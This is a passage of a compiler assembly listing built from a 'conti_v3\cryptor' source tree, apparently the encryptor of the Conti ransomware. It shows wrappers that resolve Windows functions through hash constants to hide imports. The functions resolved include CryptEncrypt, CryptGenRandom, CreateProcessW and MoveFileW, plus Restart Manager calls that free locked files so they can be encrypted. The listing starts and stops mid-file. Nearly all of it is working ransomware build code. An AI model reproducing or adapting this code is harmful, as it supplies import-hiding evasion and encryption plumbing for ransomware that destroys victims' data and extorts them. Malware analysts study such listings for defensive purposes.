  00034	48 ff e0	 rex_jmp rax
?plstrcatW@@YAPEA_WPEA_WPEB_W@Z ENDP			; plstrcatW
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pGetNativeSystemInfo@@YAXPEAU_SYSTEM_INFO@@@Z
_TEXT	SEGMENT
lpSystemInfo$ = 48
?pGetNativeSystemInfo@@YAXPEAU_SYSTEM_INFO@@@Z PROC	; pGetNativeSystemInfo, COMDAT

; 235  : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 236  : 	VOID(WINAPI * pFunction)(LPSYSTEM_INFO);
; 237  : 	pFunction = (VOID(WINAPI*)(LPSYSTEM_INFO))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xde1467b1, 90);//GetProcAddress(hKernel32, OBFA("GetNativeSystemInfo"));

  00006	ba 0f 00 00 00	 mov	 edx, 15
  0000b	41 b8 b1 67 14
	de		 mov	 r8d, -569088079		; de1467b1H
  00011	48 8b d9	 mov	 rbx, rcx
  00014	44 8d 4a 4b	 lea	 r9d, QWORD PTR [rdx+75]
  00018	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 238  : 	return pFunction(lpSystemInfo);

  0001d	48 8b cb	 mov	 rcx, rbx

; 239  : }

  00020	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00024	5b		 pop	 rbx

; 238  : 	return pFunction(lpSystemInfo);

  00025	48 ff e0	 rex_jmp rax
?pGetNativeSystemInfo@@YAXPEAU_SYSTEM_INFO@@@Z ENDP	; pGetNativeSystemInfo
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pSetFilePointerEx@@YAHPEAXT_LARGE_INTEGER@@PEAT1@K@Z
_TEXT	SEGMENT
hFile$ = 48
liDistanceToMove$ = 56
lpNewFilePointer$dead$ = 64
dwMoveMethod$ = 72
?pSetFilePointerEx@@YAHPEAXT_LARGE_INTEGER@@PEAT1@K@Z PROC ; pSetFilePointerEx, COMDAT

; 247  : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	48 89 74 24 10	 mov	 QWORD PTR [rsp+16], rsi
  0000a	57		 push	 rdi
  0000b	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  0000f	48 8b da	 mov	 rbx, rdx
  00012	41 8b f9	 mov	 edi, r9d

; 248  : 	BOOL(WINAPI * pFunction)(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD);
; 249  : 	pFunction = (BOOL(WINAPI*)(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xd6e51ba7, 89);//GetProcAddress(hKernel32, OBFA("SetFilePointerEx"));

  00015	ba 0f 00 00 00	 mov	 edx, 15
  0001a	41 b8 a7 1b e5
	d6		 mov	 r8d, -689628249		; d6e51ba7H
  00020	48 8b f1	 mov	 rsi, rcx
  00023	44 8d 4a 4a	 lea	 r9d, QWORD PTR [rdx+74]
  00027	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 250  : 	return pFunction(hFile, liDistanceToMove, lpNewFilePointer, dwMoveMethod);

  0002c	44 8b cf	 mov	 r9d, edi
  0002f	45 33 c0	 xor	 r8d, r8d
  00032	48 8b d3	 mov	 rdx, rbx
  00035	48 8b ce	 mov	 rcx, rsi

; 251  : }

  00038	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]
  0003d	48 8b 74 24 38	 mov	 rsi, QWORD PTR [rsp+56]
  00042	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00046	5f		 pop	 rdi

; 250  : 	return pFunction(hFile, liDistanceToMove, lpNewFilePointer, dwMoveMethod);

  00047	48 ff e0	 rex_jmp rax
?pSetFilePointerEx@@YAHPEAXT_LARGE_INTEGER@@PEAT1@K@Z ENDP ; pSetFilePointerEx
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pCreateProcessW@@YAHPEB_WPEA_WPEAU_SECURITY_ATTRIBUTES@@2HKPEAX0PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z
_TEXT	SEGMENT
lpApplicationName$dead$ = 96
lpCommandLine$ = 104
lpProcessAttributes$dead$ = 112
lpThreadAttributes$dead$ = 120
bInheritHandles$dead$ = 128
dwCreationFlags$dead$ = 136
lpEnvironment$dead$ = 144
lpCurrentDirectory$dead$ = 152
lpStartupInfo$ = 160
lpProcessInformation$ = 168
?pCreateProcessW@@YAHPEB_WPEA_WPEAU_SECURITY_ATTRIBUTES@@2HKPEAX0PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z PROC ; pCreateProcessW, COMDAT

; 265  : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 50	 sub	 rsp, 80			; 00000050H
  00006	48 8b da	 mov	 rbx, rdx

; 266  : 	BOOL(WINAPI * pFunction)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
; 267  : 	pFunction = (BOOL(WINAPI*)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x3a963686, 88);//GetProcAddress(hKernel32, OBFA("CreateProcessW"));

  00009	41 b8 86 36 96
	3a		 mov	 r8d, 982922886		; 3a963686H
  0000f	ba 0f 00 00 00	 mov	 edx, 15
  00014	44 8d 4a 49	 lea	 r9d, QWORD PTR [rdx+73]
  00018	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 268  : 	return pFunction(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);

  0001d	45 33 c9	 xor	 r9d, r9d
  00020	45 33 c0	 xor	 r8d, r8d
  00023	48 8b 8c 24 a0
	00 00 00	 mov	 rcx, QWORD PTR lpStartupInfo$[rsp]
  0002b	48 8b d3	 mov	 rdx, rbx
  0002e	33 c9		 xor	 ecx, ecx
  00030	48 89 8c 24 98
	00 00 00	 mov	 QWORD PTR lpCurrentDirectory$dead$[rsp], rcx
  00038	48 89 8c 24 90
	00 00 00	 mov	 QWORD PTR lpEnvironment$dead$[rsp], rcx
  00040	c7 84 24 88 00
	00 00 00 00 00
	08		 mov	 DWORD PTR dwCreationFlags$dead$[rsp], 134217728 ; 08000000H
  0004b	89 8c 24 80 00
	00 00		 mov	 DWORD PTR bInheritHandles$dead$[rsp], ecx

; 269  : }

  00052	48 83 c4 50	 add	 rsp, 80			; 00000050H
  00056	5b		 pop	 rbx

; 268  : 	return pFunction(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);

  00057	48 ff e0	 rex_jmp rax
?pCreateProcessW@@YAHPEB_WPEA_WPEAU_SECURITY_ATTRIBUTES@@2HKPEAX0PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z ENDP ; pCreateProcessW
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?plstrcpyW@@YAPEA_WPEA_WPEB_W@Z
_TEXT	SEGMENT
lpString1$ = 48
lpString2$ = 56
?plstrcpyW@@YAPEA_WPEA_WPEB_W@Z PROC			; plstrcpyW, COMDAT

; 275  : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  0000a	48 8b da	 mov	 rbx, rdx

; 276  : 	LPWSTR(WINAPI * pFunction)(LPWSTR, LPCWSTR);
; 277  : 	pFunction = (LPWSTR(WINAPI*)(LPWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x3fd9cc6a, 87);//GetProcAddress(hKernel32, OBFA("lstrcpyW"));

  0000d	41 b8 6a cc d9
	3f		 mov	 r8d, 1071238250		; 3fd9cc6aH
  00013	ba 0f 00 00 00	 mov	 edx, 15
  00018	48 8b f9	 mov	 rdi, rcx
  0001b	44 8d 4a 48	 lea	 r9d, QWORD PTR [rdx+72]
  0001f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 278  : 	return pFunction(lpString1, lpString2);

  00024	48 8b d3	 mov	 rdx, rbx
  00027	48 8b cf	 mov	 rcx, rdi

; 279  : }

  0002a	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]
  0002f	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00033	5f		 pop	 rdi

; 278  : 	return pFunction(lpString1, lpString2);

  00034	48 ff e0	 rex_jmp rax
?plstrcpyW@@YAPEA_WPEA_WPEB_W@Z ENDP			; plstrcpyW
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pMoveFileW@@YAHPEB_W0@Z
_TEXT	SEGMENT
lpExistingFileName$ = 48
lpNewFileName$ = 56
?pMoveFileW@@YAHPEB_W0@Z PROC				; pMoveFileW, COMDAT

; 285  : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  0000a	48 8b da	 mov	 rbx, rdx

; 286  : 	BOOL(WINAPI * pFunction)(LPCWSTR, LPCWSTR);
; 287  : 	pFunction = (BOOL(WINAPI*)(LPCWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x102e520c, 86);//GetProcAddress(hKernel32, OBFA("MoveFileW"));

  0000d	41 b8 0c 52 2e
	10		 mov	 r8d, 271471116		; 102e520cH
  00013	ba 0f 00 00 00	 mov	 edx, 15
  00018	48 8b f9	 mov	 rdi, rcx
  0001b	44 8d 4a 47	 lea	 r9d, QWORD PTR [rdx+71]
  0001f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 288  : 	return pFunction(lpExistingFileName, lpNewFileName);

  00024	48 8b d3	 mov	 rdx, rbx
  00027	48 8b cf	 mov	 rcx, rdi

; 289  : }

  0002a	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]
  0002f	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00033	5f		 pop	 rdi

; 288  : 	return pFunction(lpExistingFileName, lpNewFileName);

  00034	48 ff e0	 rex_jmp rax
?pMoveFileW@@YAHPEB_W0@Z ENDP				; pMoveFileW
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pCryptEncrypt@@YAH_K0HKPEAEPEAKK@Z
_TEXT	SEGMENT
hKey$ = 80
hHash$dead$ = 88
Final$dead$ = 96
dwFlags$dead$ = 104
pbData$ = 112
pdwDataLen$ = 120
dwBufLen$dead$ = 128
?pCryptEncrypt@@YAH_K0HKPEAEPEAKK@Z PROC		; pCryptEncrypt, COMDAT

; 624  : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 40	 sub	 rsp, 64			; 00000040H

; 625  : 	BOOL(WINAPI * pFunction)(HCRYPTKEY, HCRYPTHASH, BOOL, DWORD, BYTE*, DWORD*, DWORD);
; 626  : 	pFunction = (BOOL(WINAPI*)(HCRYPTKEY, HCRYPTHASH, BOOL, DWORD, BYTE*, DWORD*, DWORD))getapi::GetProcAddressEx2(NULL, ADVAPI32_MODULE_ID, 0xd3bb19e6, 54);//GetProcAddress(hAdvapi32, OBFA("CryptEncrypt"));

  00006	ba 10 00 00 00	 mov	 edx, 16
  0000b	41 b8 e6 19 bb
	d3		 mov	 r8d, -742712858		; d3bb19e6H
  00011	48 8b d9	 mov	 rbx, rcx
  00014	44 8d 4a 26	 lea	 r9d, QWORD PTR [rdx+38]
  00018	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 627  : 	return pFunction(hKey, hHash, Final, dwFlags, pbData, pdwDataLen, dwBufLen);

  0001d	45 33 c9	 xor	 r9d, r9d
  00020	c7 84 24 80 00
	00 00 0c 02 00
	00		 mov	 DWORD PTR dwBufLen$dead$[rsp], 524 ; 0000020cH
  0002b	48 8b cb	 mov	 rcx, rbx
  0002e	48 8b 54 24 70	 mov	 rdx, QWORD PTR pbData$[rsp]
  00033	45 8d 41 01	 lea	 r8d, QWORD PTR [r9+1]
  00037	33 d2		 xor	 edx, edx

; 628  : }

  00039	48 83 c4 40	 add	 rsp, 64			; 00000040H
  0003d	5b		 pop	 rbx

; 627  : 	return pFunction(hKey, hHash, Final, dwFlags, pbData, pdwDataLen, dwBufLen);

  0003e	48 ff e0	 rex_jmp rax
?pCryptEncrypt@@YAH_K0HKPEAEPEAKK@Z ENDP		; pCryptEncrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pCryptGenRandom@@YAH_KKPEAE@Z
_TEXT	SEGMENT
hProv$ = 48
dwLen$ = 56
pbBuffer$ = 64
?pCryptGenRandom@@YAH_KKPEAE@Z PROC			; pCryptGenRandom, COMDAT

; 635  : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	48 89 74 24 10	 mov	 QWORD PTR [rsp+16], rsi
  0000a	57		 push	 rdi
  0000b	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  0000f	8b fa		 mov	 edi, edx
  00011	49 8b d8	 mov	 rbx, r8

; 636  : 	BOOL(WINAPI * pFunction)(HCRYPTPROV, DWORD, BYTE*);
; 637  : 	pFunction = (BOOL(WINAPI*)(HCRYPTPROV, DWORD, BYTE*))getapi::GetProcAddressEx2(NULL, ADVAPI32_MODULE_ID, 0xe6b09957, 53);//GetProcAddress(hAdvapi32, OBFA("CryptGenRandom"));

  00014	ba 10 00 00 00	 mov	 edx, 16
  00019	41 b8 57 99 b0
	e6		 mov	 r8d, -424634025		; e6b09957H
  0001f	48 8b f1	 mov	 rsi, rcx
  00022	44 8d 4a 25	 lea	 r9d, QWORD PTR [rdx+37]
  00026	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 638  : 	return pFunction(hProv, dwLen, pbBuffer);

  0002b	4c 8b c3	 mov	 r8, rbx
  0002e	8b d7		 mov	 edx, edi
  00030	48 8b ce	 mov	 rcx, rsi

; 639  : }

  00033	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]
  00038	48 8b 74 24 38	 mov	 rsi, QWORD PTR [rsp+56]
  0003d	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00041	5f		 pop	 rdi

; 638  : 	return pFunction(hProv, dwLen, pbBuffer);

  00042	48 ff e0	 rex_jmp rax
?pCryptGenRandom@@YAH_KKPEAE@Z ENDP			; pCryptGenRandom
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pRmEndSession@@YAKK@Z
_TEXT	SEGMENT
dwSessionHandle$ = 48
?pRmEndSession@@YAKK@Z PROC				; pRmEndSession, COMDAT

; 709  : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 710  : 	DWORD(WINAPI * pFunction)(DWORD);
; 711  : 	pFunction = (DWORD(WINAPI*)(DWORD))getapi::GetProcAddressEx2(NULL, RSTRTMGR_MODULE_ID, 0xa8f528dd, 47);//GetProcAddress(hRstrtmgr, OBFA("RmEndSession"));

  00006	ba 13 00 00 00	 mov	 edx, 19
  0000b	41 b8 dd 28 f5
	a8		 mov	 r8d, -1460328227	; a8f528ddH
  00011	8b d9		 mov	 ebx, ecx
  00013	44 8d 4a 1c	 lea	 r9d, QWORD PTR [rdx+28]
  00017	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 712  : 	return pFunction(dwSessionHandle);

  0001c	8b cb		 mov	 ecx, ebx

; 713  : }

  0001e	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00022	5b		 pop	 rbx

; 712  : 	return pFunction(dwSessionHandle);

  00023	48 ff e0	 rex_jmp rax
?pRmEndSession@@YAKK@Z ENDP				; pRmEndSession
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pRmStartSession@@YAKPEAKKPEA_W@Z
_TEXT	SEGMENT
pSessionHandle$ = 48
dwSessionFlags$dead$ = 56
strSessionKey$ = 64
?pRmStartSession@@YAKPEAKKPEA_W@Z PROC			; pRmStartSession, COMDAT

; 721  : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 722  : 	DWORD(WINAPI * pFunction)(DWORD*, DWORD, WCHAR*);
; 723  : 	pFunction = (DWORD(WINAPI*)(DWORD*, DWORD, WCHAR*))getapi::GetProcAddressEx2(NULL, RSTRTMGR_MODULE_ID, 0x3763d345, 46);//GetProcAddress(hRstrtmgr, OBFA("RmStartSession"));

  0000a	ba 13 00 00 00	 mov	 edx, 19
  0000f	49 8b d8	 mov	 rbx, r8
  00012	41 b8 45 d3 63
	37		 mov	 r8d, 929289029		; 3763d345H
  00018	48 8b f9	 mov	 rdi, rcx
  0001b	44 8d 4a 1b	 lea	 r9d, QWORD PTR [rdx+27]
  0001f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 724  : 	return pFunction(pSessionHandle, dwSessionFlags, strSessionKey);

  00024	4c 8b c3	 mov	 r8, rbx
  00027	33 d2		 xor	 edx, edx
  00029	48 8b cf	 mov	 rcx, rdi

; 725  : }

  0002c	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]
  00031	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00035	5f		 pop	 rdi

; 724  : 	return pFunction(pSessionHandle, dwSessionFlags, strSessionKey);

  00036	48 ff e0	 rex_jmp rax
?pRmStartSession@@YAKPEAKKPEA_W@Z ENDP			; pRmStartSession
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pRmGetList@@YAKKPEAI0PEAU_RM_PROCESS_INFO@@PEAK@Z
_TEXT	SEGMENT
dwSessionHandle$ = 64
pnProcInfoNeeded$ = 72
pnProcInfo$ = 80
rgAffectedApps$ = 88
lpdwRebootReasons$ = 96
?pRmGetList@@YAKKPEAI0PEAU_RM_PROCESS_INFO@@PEAK@Z PROC	; pRmGetList, COMDAT

; 734  : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	48 89 6c 24 10	 mov	 QWORD PTR [rsp+16], rbp
  0000a	48 89 74 24 18	 mov	 QWORD PTR [rsp+24], rsi
  0000f	57		 push	 rdi
  00010	48 83 ec 30	 sub	 rsp, 48			; 00000030H
  00014	48 8b f2	 mov	 rsi, rdx
  00017	49 8b d9	 mov	 rbx, r9

; 735  : 	DWORD(WINAPI * pFunction)(DWORD, UINT*, UINT*, RM_PROCESS_INFO*, LPDWORD);
; 736  : 	pFunction = (DWORD(WINAPI*)(DWORD, UINT*, UINT*, RM_PROCESS_INFO*, LPDWORD))getapi::GetProcAddressEx2(NULL, RSTRTMGR_MODULE_ID, 0x462fab0f, 45);//GetProcAddress(hRstrtmgr, OBFA("RmGetList"));

  0001a	ba 13 00 00 00	 mov	 edx, 19
  0001f	49 8b f8	 mov	 rdi, r8
  00022	41 b8 0f ab 2f
	46		 mov	 r8d, 1177529103		; 462fab0fH
  00028	8b e9		 mov	 ebp, ecx
  0002a	44 8d 4a 1a	 lea	 r9d, QWORD PTR [rdx+26]
  0002e	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 737  : 	return pFunction(dwSessionHandle, pnProcInfoNeeded, pnProcInfo, rgAffectedApps, lpdwRebootReasons);

  00033	4c 8b cb	 mov	 r9, rbx
  00036	4c 8b c7	 mov	 r8, rdi
  00039	48 8b d6	 mov	 rdx, rsi
  0003c	8b cd		 mov	 ecx, ebp

; 738  : }

  0003e	48 8b 5c 24 40	 mov	 rbx, QWORD PTR [rsp+64]
  00043	48 8b 6c 24 48	 mov	 rbp, QWORD PTR [rsp+72]
  00048	48 8b 74 24 50	 mov	 rsi, QWORD PTR [rsp+80]
  0004d	48 83 c4 30	 add	 rsp, 48			; 00000030H
  00051	5f		 pop	 rdi

; 737  : 	return pFunction(dwSessionHandle, pnProcInfoNeeded, pnProcInfo, rgAffectedApps, lpdwRebootReasons);

  00052	48 ff e0	 rex_jmp rax
?pRmGetList@@YAKKPEAI0PEAU_RM_PROCESS_INFO@@PEAK@Z ENDP	; pRmGetList
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pRmRegisterResources@@YAKKIPEAPEB_WIPEAU_RM_UNIQUE_PROCESS@@I0@Z
_TEXT	SEGMENT
dwSessionHandle$ = 80
nFiles$dead$ = 88
rgsFileNames$ = 96
nApplications$dead$ = 104
rgApplications$dead$ = 112
nServices$dead$ = 120
rgsServiceNames$dead$ = 128
?pRmRegisterResources@@YAKKIPEAPEB_WIPEAU_RM_UNIQUE_PROCESS@@I0@Z PROC ; pRmRegisterResources, COMDAT

; 750  : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 40	 sub	 rsp, 64			; 00000040H

; 751  : 	DWORD(WINAPI * pFunction)(DWORD, UINT, LPCWSTR*, UINT, RM_UNIQUE_PROCESS*, UINT, LPCWSTR*);
; 752  : 	pFunction = (DWORD(WINAPI*)(DWORD, UINT, LPCWSTR*, UINT, RM_UNIQUE_PROCESS*, UINT, LPCWSTR*))getapi::GetProcAddressEx2(NULL, RSTRTMGR_MODULE_ID, 0x803a648e, 44);//GetProcAddress(hRstrtmgr, OBFA("RmRegisterResources"));

  0000a	ba 13 00 00 00	 mov	 edx, 19
  0000f	49 8b d8	 mov	 rbx, r8
  00012	41 b8 8e 64 3a
	80		 mov	 r8d, -2143656818	; 803a648eH
  00018	8b f9		 mov	 edi, ecx
  0001a	44 8d 4a 19	 lea	 r9d, QWORD PTR [rdx+25]
  0001e	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 753  : 	return pFunction(dwSessionHandle, nFiles, rgsFileNames, nApplications, rgApplications, nServices, rgsServiceNames);

  00023	33 c9		 xor	 ecx, ecx
  00025	45 33 c9	 xor	 r9d, r9d
  00028	48 89 8c 24 80
	00 00 00	 mov	 QWORD PTR rgsServiceNames$dead$[rsp], rcx
  00030	4c 8b c3	 mov	 r8, rbx
  00033	89 4c 24 78	 mov	 DWORD PTR nServices$dead$[rsp], ecx
  00037	48 89 4c 24 70	 mov	 QWORD PTR rgApplications$dead$[rsp], rcx
  0003c	8d 51 01	 lea	 edx, QWORD PTR [rcx+1]
  0003f	8b cf		 mov	 ecx, edi

; 754  : }

  00041	48 8b 5c 24 50	 mov	 rbx, QWORD PTR [rsp+80]
  00046	48 83 c4 40	 add	 rsp, 64			; 00000040H
  0004a	5f		 pop	 rdi

; 753  : 	return pFunction(dwSessionHandle, nFiles, rgsFileNames, nApplications, rgApplications, nServices, rgsServiceNames);

  0004b	48 ff e0	 rex_jmp rax
?pRmRegisterResources@@YAKKIPEAPEB_WIPEAU_RM_UNIQUE_PROCESS@@I0@Z ENDP ; pRmRegisterResources
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pRmShutdown@@YAKKKP6AXI@Z@Z
_TEXT	SEGMENT
dwSessionHandle$ = 48
lActionFlags$dead$ = 56
fnStatus$dead$ = 64
?pRmShutdown@@YAKKKP6AXI@Z@Z PROC			; pRmShutdown, COMDAT

; 761  : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 762  : 	DWORD(WINAPI * pFunction)(DWORD, ULONG, RM_WRITE_STATUS_CALLBACK);
; 763  : 	pFunction = (DWORD(WINAPI*)(DWORD, ULONG, RM_WRITE_STATUS_CALLBACK))getapi::GetProcAddressEx2(NULL, RSTRTMGR_MODULE_ID, 0xe7d62d41, 43);//GetProcAddress(hRstrtmgr, OBFA("RmShutdown"));

  00006	ba 13 00 00 00	 mov	 edx, 19
  0000b	41 b8 41 2d d6
	e7		 mov	 r8d, -405394111		; e7d62d41H
  00011	8b d9		 mov	 ebx, ecx
  00013	44 8d 4a 18	 lea	 r9d, QWORD PTR [rdx+24]
  00017	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 764  : 	return pFunction(dwSessionHandle, lActionFlags, fnStatus);

  0001c	45 33 c0	 xor	 r8d, r8d
  0001f	8b cb		 mov	 ecx, ebx
  00021	41 8d 50 01	 lea	 edx, QWORD PTR [r8+1]

; 765  : }

  00025	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00029	5b		 pop	 rbx

; 764  : 	return pFunction(dwSessionHandle, lActionFlags, fnStatus);

  0002a	48 ff e0	 rex_jmp rax
?pRmShutdown@@YAKKKP6AXI@Z@Z ENDP			; pRmShutdown
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pCoUninitialize@@YAXXZ
_TEXT	SEGMENT
?pCoUninitialize@@YAXXZ PROC				; pCoUninitialize, COMDAT

; 768  : {

$LN4:
  00000	48 83 ec 28	 sub	 rsp, 40			; 00000028H

; 769  : 	VOID(WINAPI * pFunction)();
; 770  : 	pFunction = (VOID(WINAPI*)())getapi::GetProcAddressEx2(NULL, OLE32_MODULE_ID, 0x68cc2bb5, 1);//GetProcAddress(hOle32, OBFA("CoUninitialize"));

  00004	ba 18 00 00 00	 mov	 edx, 24
  00009	41 b8 b5 2b cc
	68		 mov	 r8d, 1758210997		; 68cc2bb5H
  0000f	44 8d 4a e9	 lea	 r9d, QWORD PTR [rdx-23]
  00013	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 772  : }

  00018	48 83 c4 28	 add	 rsp, 40			; 00000028H

; 771  : 	return pFunction();

  0001c	48 ff e0	 rex_jmp rax
?pCoUninitialize@@YAXXZ ENDP				; pCoUninitialize
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pCoCreateInstance@@YAJAEBU_GUID@@PEAUIUnknown@@K0PEAPEAX@Z
_TEXT	SEGMENT
rclsid$ = 64
pUnkOuter$dead$ = 72
dwClsContext$dead$ = 80
riid$ = 88
ppv$ = 96
?pCoCreateInstance@@YAJAEBU_GUID@@PEAUIUnknown@@K0PEAPEAX@Z PROC ; pCoCreateInstance, COMDAT

; 781  : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 30	 sub	 rsp, 48			; 00000030H

; 782  : 	HRESULT(WINAPI * pFunction)(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*);
; 783  : 	pFunction = (HRESULT(WINAPI*)(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*))getapi::GetProcAddressEx2(NULL, OLE32_MODULE_ID, 0x5abc5ed6, 42);//GetProcAddress(hOle32, OBFA("CoCreateInstance"));

  0000a	ba 18 00 00 00	 mov	 edx, 24
  0000f	49 8b d9	 mov	 rbx, r9
  00012	41 b8 d6 5e bc
	5a		 mov	 r8d, 1522294486		; 5abc5ed6H
  00018	48 8b f9	 mov	 rdi, rcx
  0001b	44 8d 4a 12	 lea	 r9d, QWORD PTR [rdx+18]
  0001f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 784  : 	return pFunction(rclsid, pUnkOuter, dwClsContext, riid, ppv);

